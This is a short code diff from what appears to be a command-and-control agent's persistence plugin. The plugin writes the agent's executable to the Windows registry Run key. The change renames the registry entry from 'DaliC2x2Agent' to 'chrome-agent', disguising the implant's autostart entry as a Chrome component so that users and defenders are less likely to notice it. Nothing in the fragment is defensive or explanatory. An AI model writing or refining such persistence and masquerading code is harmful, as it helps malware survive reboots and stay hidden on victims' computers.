@@ -24,7 +24,7 @@ class PersistPlugin(BasePlugin):
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             
             with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "DaliC2x2Agent", 0, winreg.REG_SZ, exe_path)
+                winreg.SetValueEx(reg_key, "chrome-agent", 0, winreg.REG_SZ, exe_path)
             
             return {"status": "success", "output": f"Persistence established in Registry: {exe_path}"}
         except Exception as e:
